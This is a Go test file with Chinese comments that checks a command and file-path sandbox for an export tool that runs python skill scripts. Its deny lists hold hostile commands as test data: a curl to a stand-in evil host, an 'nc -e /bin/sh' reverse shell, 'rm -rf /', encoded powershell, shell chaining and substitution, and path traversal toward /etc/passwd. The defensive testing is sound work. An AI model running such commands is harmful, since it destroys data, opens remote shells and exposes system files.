package export

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

// ─── 命令沙箱校验 ────────────────────────────────────────────

// execute 命令策略（v2）：只允许 python 运行 skills/ 目录内已存在的技能脚本，
// 不经过 shell，禁止 pip / -c / -m / 任意工作区脚本 / shell 元字符。
func TestValidateSandboxedCommand(t *testing.T) {
	// 用真实存在的技能脚本作为放行样例
	pptScript := filepath.Join("skills", "export-ppt", "scripts", "export_ppt.py")
	if _, err := os.Stat(pptScript); err != nil {
		t.Skipf("技能脚本缺失，跳过：%v", err)
	}
	tmpFile := filepath.Join(os.TempDir(), "websql_sandbox_test_input.json")
	_ = os.WriteFile(tmpFile, []byte("{}"), 0o644)
	defer os.Remove(tmpFile)

	okCases := []struct {
		name string
		cmd  string
	}{
		{"运行技能脚本", "python " + pptScript},
		{"python3 运行技能脚本", "python3 " + pptScript},
		{"位置参数传入 JSON", "python " + pptScript + " " + tmpFile},
		{"标准输入重定向", "python " + pptScript + " < " + tmpFile},
		{"编码前缀", "chcp 65001 >nul && set PYTHONIOENCODING=utf-8 && python " + pptScript},
		{"环境变量前缀", "PYTHONIOENCODING=utf-8 python " + pptScript},
		{"解释器 -u 参数", "python -u " + pptScript},
		{"tail 日志后缀", "python " + pptScript + " 2>&1 | tail -20"},
	}
	for _, tc := range okCases {
		t.Run("allow/"+tc.name, func(t *testing.T) {
			if err := validateSandboxedCommand(tc.cmd); err != nil {
				t.Errorf("validateSandboxedCommand(%q) 应放行，实际拒绝：%v", tc.cmd, err)
			}
		})
	}

	badCases := []struct {
		name string
		cmd  string
	}{
		{"pip 安装（禁止运行时安装）", "pip install requests"},
		{"内联代码 -c", `python -c "import os; os.system('calc')"`},
		{"模块执行 -m", "python -m http.server"},
		{"工作区脚本（非技能目录）", "python " + filepath.Join(getSandboxRoots().workspace, "gen.py")},
		{"沙箱外绝对路径脚本", sandboxEscapeCommand()},
		{"命令拼接 &&", "python " + pptScript + " && rm -rf /"},
		{"命令分隔 ;", "python " + pptScript + " ; whoami"},
		{"管道到 shell", "python " + pptScript + " | sh"},
		{"命令替换", "python $(echo evil).py"},
		{"rm -rf", "rm -rf /"},
		{"Windows 批量删除", "del /s /q C:\\data"},
		{"powershell 编码执行", "powershell -enc ZQBjAGgAbwA="},
		{"网络外传 curl", "curl http://evil.example/x.sh"},
		{"反弹 shell", "nc -e /bin/sh 10.0.0.1 4444"},
		{"系统关机", "shutdown /s /t 0"},
		{"非 python 命令", "node evil.js"},
		{"shell 直接执行", "cmd /c whoami"},
		{"非 py 脚本", "python " + filepath.Join("skills", "evil.sh")},
	}
	for _, tc := range badCases {
		t.Run("deny/"+tc.name, func(t *testing.T) {
			if err := validateSandboxedCommand(tc.cmd); err == nil {
				t.Errorf("validateSandboxedCommand(%q) 应被拒绝，实际放行", tc.cmd)
			}
		})
	}
}

func sandboxEscapeCommand() string {
	if runtime.GOOS == "windows" {
		return "python C:\\Windows\\System32\\evil.py"
	}
	return "python /etc/evil.py"
}

// ── 文件路径沙箱 ────────────────────────────────────────────

func TestResolveWritePath(t *testing.T) {
	// 相对路径 exports/xxx 与工作区相对路径均可写
	if p, err := resolveWritePath(filepath.Join("exports", "a.xlsx")); err != nil {
		t.Errorf("exports 相对路径应可写，实际：%v", err)
	} else if !strings.HasSuffix(p, filepath.Join("exports", "a.xlsx")) {
		t.Errorf("exports 相对路径解析异常：%s", p)
	}
	if _, err := resolveWritePath("ppt_input.json"); err != nil {
		t.Errorf("工作区相对路径应可写，实际：%v", err)
	}
	if _, err := resolveWritePath(filepath.Join(os.TempDir(), "websql_sandbox_test.txt")); err != nil {
		t.Errorf("临时目录应可写，实际：%v", err)
	}

	// 路径穿越与沙箱外路径必须拒绝
	escapeCases := []string{
		filepath.Join("..", "..", "evil.txt"),
		filepath.Join("..", "..", "..", "..", "..", "evil.txt"),
	}
	if runtime.GOOS == "windows" {
		escapeCases = append(escapeCases, `C:\Windows\System32\evil.dll`)
	} else {
		escapeCases = append(escapeCases, "/etc/passwd")
	}
	for _, p := range escapeCases {
		if _, err := resolveWritePath(p); err == nil {
			t.Errorf("resolveWritePath(%q) 应被拒绝，实际放行", p)
		}
	}

	// skills 目录只读：用绝对路径写入必须被拒绝（相对路径 skills/xxx 会落回工作区内的同名子目录，
	// 不会触及真实 skills 目录，属于安全降级行为）
	skillsAbs, err := filepath.Abs(filepath.Join("skills", "export-ppt", "scripts", "x.py"))
	if err != nil {
		t.Fatalf("abs 失败：%v", err)
	}
	if _, err := resolveWritePath(skillsAbs); err == nil {
		t.Error("skills 目录（绝对路径）应只读，写入应被拒绝")
	}
	// 真正落在 skills 目录的相对写入应回落为工作区内路径
	if p, err := resolveWritePath(filepath.Join("skills", "tmp_gen.py")); err == nil {
		wsAbs, _ := filepath.Abs(getSandboxRoots().workspace)
		if !strings.HasPrefix(p, wsAbs) {
			t.Errorf("相对 skills 写入应落回工作区，实际：%s", p)
		}
	}
}

func TestResolveReadPath(t *testing.T) {
	if _, err := resolveReadPath(filepath.Join("skills", "export-ppt", "SKILL.md")); err != nil {
		t.Errorf("skills 目录应可读，实际：%v", err)
	}
	offloadAbs, absErr := filepath.Abs(filepath.Join("data", "reduction", "a.txt"))
	if absErr != nil {
		t.Fatalf("abs 失败：%v", absErr)
	}
	if _, err := resolveReadPath(offloadAbs); err == nil {
		t.Error("data/reduction 属于 offload 私有目录，通用 read_file 不应可读")
	}
	if runtime.GOOS == "windows" {
		if _, err := resolveReadPath(`C:\Windows\win.ini`); err == nil {
			t.Error("系统目录应不可读，实际放行")
		}
	} else {
		if _, err := resolveReadPath("/etc/passwd"); err == nil {
			t.Error("系统目录应不可读，实际放行")
		}
	}
}

// ─── 导出文件名路径穿越（回归测试） ──────────────────────────

func TestSanitizeFileNameNoPathTraversal(t *testing.T) {
	cases := []string{
		"../../evil",
		`..\..\evil`,
		".././../etc/passwd",
		`C:\Windows\System32\evil`,
		"/tmp/evil",
		"..",
		".",
		"   ",
		"a/b\\c:d",
	}
	for _, in := range cases {
		got := SanitizeFileName(in, "export")
		if strings.ContainsAny(got, `/\`) {
			t.Errorf("SanitizeFileName(%q) = %q，仍包含路径分隔符", in, got)
		}
		if strings.Contains(got, "..") {
			t.Errorf("SanitizeFileName(%q) = %q，仍包含 ..", in, got)
		}
		// 必须能安全地拼接到 exports 目录下且不发生逃逸
		full := filepath.Join("exports", got+".xlsx")
		abs, err := filepath.Abs(full)
		if err != nil {
			t.Fatalf("abs 失败：%v", err)
		}
		exportsAbs, _ := filepath.Abs("exports")
		if !strings.HasPrefix(abs, exportsAbs) {
			t.Errorf("SanitizeFileName(%q) = %q 拼接后逃逸出 exports：%s", in, got, abs)
		}
	}
}

func TestSanitizeFileNameKeepsNormalName(t *testing.T) {
	got := SanitizeFileName("销售月报", "export")
	if !strings.HasPrefix(got, "销售月报_") {
		t.Errorf("正常中文名应保留，实际：%q", got)
	}
	if got := SanitizeFileName("report.xlsx", "export"); !strings.HasPrefix(got, "report_") {
		t.Errorf("扩展名应被剥离，实际：%q", got)
	}
	if got := SanitizeFileName("", "export"); !strings.HasPrefix(got, "export_") {
		t.Errorf("空名应回退到默认前缀，实际：%q", got)
	}
}
